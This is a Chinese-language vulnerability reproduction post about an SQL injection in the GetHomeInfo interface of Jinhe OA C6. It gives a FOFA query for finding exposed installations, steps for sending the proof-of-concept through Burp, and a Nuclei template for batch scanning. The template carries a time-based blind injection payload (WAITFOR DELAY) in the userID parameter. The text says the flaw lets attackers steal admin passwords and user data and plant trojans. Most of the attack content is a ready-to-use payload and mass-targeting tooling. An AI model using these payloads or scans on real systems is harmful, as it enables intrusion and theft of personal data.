**漏洞简介**

金和网络是专业信息化服务商，为城市监管部门提供了互联网+监管解决方案，为企事业单位提供组织协同OA系统升开发平台，电子政务一体化平台智慧电商平台等服务。金和OA C6 GetHomeInfo接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

**漏洞复现**

**第一步、使用下面fofa语句进行资产收集...确认测试目标**

```
fofa语句app="金和网络-金和OA"
```

**第二步、访问漏洞首页**

**第三步、拼接POC进行访问，拼接POC使用burp进行抓包...发送到Repeater中进行测试**

![图片](%E9%87%91%E5%92%8COA%20C6%20GetHomeInfo%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.assets/640.png)

批量扫描

```yaml

id: jinhe-jc6-GetHomeInfo-sqlij
info:
  name: jinhe-jc6-GetHomeInfo-sqlij
  author: kanyue
  severity: high
  description: |
    金和网络是专业信息化服务商，为城市监管部门提供了互联网+监管解决方案，为企事业单位提供组织协同OA系统升开发平台，电子政务一体化平台智慧电商平合等服务。金和OA C6 GetHomeInfo接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  metadata:
    fofa-query: app="金和网络-金和OA"
  tags: jinhe,jc6,oa,sqlij

http:
  - raw:
      - |
        GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
        Host: {{Hostname}}
        Pragma: no-cache
        Cache-Control: no-cache
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
```

